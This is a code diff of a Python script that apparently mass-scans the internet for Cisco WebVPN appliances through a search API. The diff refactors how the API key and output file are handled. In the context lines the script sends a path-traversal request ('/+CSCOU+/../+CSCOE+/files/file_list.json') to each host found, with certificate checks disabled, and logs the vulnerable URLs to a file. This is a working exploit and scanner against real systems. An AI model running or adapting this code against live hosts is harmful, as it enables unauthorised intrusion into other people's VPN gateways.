@@ -23,7 +23,13 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 #+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/3
 
 # Configuration
-API_KEY = "YOURAPIKEY"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'webvpn port:"443"'
 FILE = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
 session = requests.Session()
@@ -44,7 +50,7 @@ def grab_file (IP,PORT,FILE):
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
 		if 'no_svc.html' in result:
-			text_file = open("./cfg/vun.cfg", "a")
+			text_file = open_output("cfg/vun.cfg", "a")
 			text_file.write(""+URL+"\n")
 			text_file.close()
 			print ("[*] Vun VPN ... Found [*]\n")
